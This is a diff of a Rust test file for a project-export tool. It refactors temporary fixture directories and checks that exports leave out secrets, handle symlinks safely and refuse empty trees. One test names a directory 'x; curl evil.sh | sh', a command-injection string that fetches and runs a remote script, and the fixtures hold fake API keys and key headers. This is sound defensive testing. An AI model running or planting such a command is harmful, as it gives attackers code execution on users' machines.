@@ -22,17 +22,52 @@ const SYNTHETIC_SECRET: &str = "sk-ant-synthetic-fixture-0123456789";
 /// as a link, never as its content.
 const OUTSIDE_SECRET: &str = "host-secret-that-must-not-travel";
 
+/// A directory in the temporary area that removes itself when it is
+/// dropped: the fixture leaves nothing behind.
+struct Tree {
+    path: PathBuf,
+}
+
+impl Tree {
+    fn new(name: &str) -> Self {
+        let path = std::env::temp_dir().join(format!(
+            "hodei-export-fixture-{}-{name}",
+            std::process::id()
+        ));
+        let _ = std::fs::remove_dir_all(&path);
+        std::fs::create_dir_all(&path).expect("the fixture directory");
+        Tree { path }
+    }
+
+    fn path(&self) -> &Path {
+        &self.path
+    }
+}
+
+impl Drop for Tree {
+    fn drop(&mut self) {
+        let _ = std::fs::remove_dir_all(&self.path);
+    }
+}
+
 /// Build a project with secrets, caches and unversioned changes.
 struct Fixture {
-    dir: PathBuf,
+    tree: Tree,
+}
+
+impl Fixture {
+    fn dir(&self) -> &Path {
+        self.tree.path()
+    }
 }
 
 impl Fixture {
     /// A git project whose index vouches for a secret, a cache and a
     /// plain source file.
     fn git_project(name: &str) -> Self {
-        let dir = temp_dir(name);
-        git::init_fixture_repo(&dir).expect("the fixture repository");
+        let tree = Tree::new(name);
+        let dir = tree.path();
+        git::init_fixture_repo(dir).expect("the fixture repository");
         write(
             &dir.join("src/main.rs"),
             "fn main() { println!(\"ok\"); }\n",
@@ -44,37 +79,39 @@ impl Fixture {
         write(&dir.join("secrets/notes.txt"), "a note\n");
         write(&dir.join("deploy/id_rsa"), "-----BEGIN PRIVATE KEY-----\n");
         write(&dir.join("notes.md"), "committed notes\n");
-        commit_all(&dir, "base");
-        Fixture { dir }
+        commit_all(dir, "base");
+        Fixture { tree }
     }
 
     /// The same project with unversioned changes: a modified tracked file
     /// and an untracked one.
     fn with_unversioned_changes(self) -> Self {
-        write(&self.dir.join("notes.md"), "notes edited in the worktree\n");
-        write(&self.dir.join("scratch.txt"), "a scratch file\n");
-        write(&self.dir.join("target/debug/build.log"), "a build cache\n");
+        write(
+            &self.dir().join("notes.md"),
+            "notes edited in the worktree\n",
+        );
+        write(&self.dir().join("scratch.txt"), "a scratch file\n");
+        write(
+            &self.dir().join("target/debug/build.log"),
+            "a build cache\n",
+        );
         self
     }
 
     /// A plain directory: no repository, no index, no versioned content.
     fn plain_directory(name: &str) -> Self {
-        let dir = temp_dir(name);
-        write(&dir.join("Cargo.toml"), "[package]\nname = \"fixture\"\n");
-        write(&dir.join("src/main.rs"), "fn main() {}\n");
-        write(&dir.join(".env"), &format!("TOKEN={SYNTHETIC_SECRET}\n"));
-        Fixture { dir }
+        let tree = Tree::new(name);
+        write(
+            &tree.path().join("Cargo.toml"),
+            "[package]\nname = \"fixture\"\n",
+        );
+        write(&tree.path().join("src/main.rs"), "fn main() {}\n");
+        write(
+            &tree.path().join(".env"),
+            &format!("TOKEN={SYNTHETIC_SECRET}\n"),
+        );
+        Fixture { tree }
     }
-}
-
-fn temp_dir(name: &str) -> PathBuf {
-    let dir = std::env::temp_dir().join(format!(
-        "hodei-export-fixture-{}-{name}",
-        std::process::id()
-    ));
-    let _ = std::fs::remove_dir_all(&dir);
-    std::fs::create_dir_all(&dir).expect("the fixture directory");
-    dir
 }
 
 fn write(path: &Path, content: &str) {
@@ -133,7 +170,8 @@ fn denials(report: &hodei_mh_workspace::export::ProjectExport) -> Vec<(String, S
 #[test]
 fn the_export_carries_the_versioned_files_and_nothing_else() {
     let fixture = Fixture::git_project("tracked");
-    let staged = stage_project(&fixture.dir, ExportPolicy::TrackedOnly).expect("the export stages");
+    let staged =
+        stage_project(fixture.dir(), ExportPolicy::TrackedOnly).expect("the export stages");
 
     assert_eq!(staged.report().source, ExportSource::GitIndex);
     assert_eq!(
@@ -184,7 +222,8 @@ fn the_export_carries_the_versioned_files_and_nothing_else() {
 #[test]
 fn the_report_never_carries_the_secret() {
     let fixture = Fixture::git_project("report");
-    let staged = stage_project(&fixture.dir, ExportPolicy::TrackedOnly).expect("the export stages");
+    let staged =
+        stage_project(fixture.dir(), ExportPolicy::TrackedOnly).expect("the export stages");
     let report = serde_json::to_string(staged.report()).expect("the report serializes");
     assert!(
         !report.contains(SYNTHETIC_SECRET),
@@ -201,7 +240,7 @@ fn the_unversioned_changes_need_the_explicit_policy() {
     let fixture = Fixture::git_project("unversioned").with_unversioned_changes();
 
     let tracked =
-        stage_project(&fixture.dir, ExportPolicy::TrackedOnly).expect("the export stages");
+        stage_project(fixture.dir(), ExportPolicy::TrackedOnly).expect("the export stages");
     assert!(
         !tracked
             .report()
@@ -218,7 +257,7 @@ fn the_unversioned_changes_need_the_explicit_policy() {
     );
 
     let untracked =
-        stage_project(&fixture.dir, ExportPolicy::WithUntracked).expect("the export stages");
+        stage_project(fixture.dir(), ExportPolicy::WithUntracked).expect("the export stages");
     assert!(
         untracked
             .report()
@@ -248,7 +287,8 @@ fn the_unversioned_changes_need_the_explicit_policy() {
 #[test]
 fn a_plain_directory_is_exported_by_its_own_tree() {
     let fixture = Fixture::plain_directory("plain");
-    let staged = stage_project(&fixture.dir, ExportPolicy::TrackedOnly).expect("the export stages");
+    let staged =
+        stage_project(fixture.dir(), ExportPolicy::TrackedOnly).expect("the export stages");
 
     assert_eq!(staged.report().source, ExportSource::TreeWalk);
     assert_eq!(
@@ -261,16 +301,17 @@ fn a_plain_directory_is_exported_by_its_own_tree() {
 
 #[test]
 fn a_link_travels_as_a_link_and_never_as_its_content() {
-    let outside = temp_dir("outside");
-    write(&outside.join("host-secret.txt"), OUTSIDE_SECRET);
+    let outside = Tree::new("outside");
+    write(&outside.path().join("host-secret.txt"), OUTSIDE_SECRET);
     let fixture = Fixture::plain_directory("symlink");
     std::os::unix::fs::symlink(
-        outside.join("host-secret.txt"),
-        fixture.dir.join("link.txt"),
+        outside.path().join("host-secret.txt"),
+        fixture.dir().join("link.txt"),
     )
     .expect("the link");
 
-    let staged = stage_project(&fixture.dir, ExportPolicy::TrackedOnly).expect("the export stages");
+    let staged =
+        stage_project(fixture.dir(), ExportPolicy::TrackedOnly).expect("the export stages");
     let bytes = staged.bytes().expect("the archive reads");
     assert!(
         !String::from_utf8_lossy(&bytes).contains(OUTSIDE_SECRET),
@@ -293,8 +334,8 @@ fn a_hostile_directory_name_is_inert_data() {
     // The name of the project never reaches a host command: the export
     // reads the tree with the path as a WORKING DIRECTORY, not as an
     // argument of a shell.
-    let base = temp_dir("hostile");
-    let dir = base.join("x; curl evil.sh | sh");
+    let base = Tree::new("hostile");
+    let dir = base.path().join("x; curl evil.sh | sh");
     std::fs::create_dir_all(&dir).expect("the fixture directory");
     write(&dir.join("main.rs"), "fn main() {}\n");
 
@@ -311,13 +352,13 @@ fn a_hostile_directory_name_is_inert_data() {
 #[test]
 fn an_export_without_a_single_file_is_refused_with_its_reason() {
     // Everything denied: the refusal says which rules denied it.
-    let denied_only = temp_dir("denied-only");
+    let denied_only = Tree::new("denied-only");
     write(
-        &denied_only.join(".env"),
+        &denied_only.path().join(".env"),
         &format!("TOKEN={SYNTHETIC_SECRET}\n"),
     );
-    let error =
-        stage_project(&denied_only, ExportPolicy::TrackedOnly).expect_err("the export refuses");
+    let error = stage_project(denied_only.path(), ExportPolicy::TrackedOnly)
+        .expect_err("the export refuses");
     assert!(
         matches!(error, StageError::AllDenied { .. }),
         "a denied export is not an empty one: {error}"
@@ -325,15 +366,15 @@ fn an_export_without_a_single_file_is_refused_with_its_reason() {
 
     // Nothing at all: the refusal says the tree holds no versioned content.
     let empty = Fixture::git_project("empty");
-    std::fs::remove_dir_all(empty.dir.join("src")).expect("the fixture files");
-    std::fs::remove_file(empty.dir.join(".gitignore")).expect("the fixture file");
-    std::fs::remove_file(empty.dir.join(".env")).expect("the fixture file");
-    std::fs::remove_file(empty.dir.join("notes.md")).expect("the fixture file");
-    std::fs::remove_dir_all(empty.dir.join("secrets")).expect("the fixture files");
-    std::fs::remove_dir_all(empty.dir.join("deploy")).expect("the fixture files");
-    commit_all(&empty.dir, "empty");
+    std::fs::remove_dir_all(empty.dir().join("src")).expect("the fixture files");
+    std::fs::remove_file(empty.dir().join(".gitignore")).expect("the fixture file");
+    std::fs::remove_file(empty.dir().join(".env")).expect("the fixture file");
+    std::fs::remove_file(empty.dir().join("notes.md")).expect("the fixture file");
+    std::fs::remove_dir_all(empty.dir().join("secrets")).expect("the fixture files");
+    std::fs::remove_dir_all(empty.dir().join("deploy")).expect("the fixture files");
+    commit_all(empty.dir(), "empty");
     let error =
-        stage_project(&empty.dir, ExportPolicy::TrackedOnly).expect_err("the export refuses");
+        stage_project(empty.dir(), ExportPolicy::TrackedOnly).expect_err("the export refuses");
     match error {
         StageError::Empty { reason, hint } => {
             assert!(reason.contains("versioned"), "{reason}");
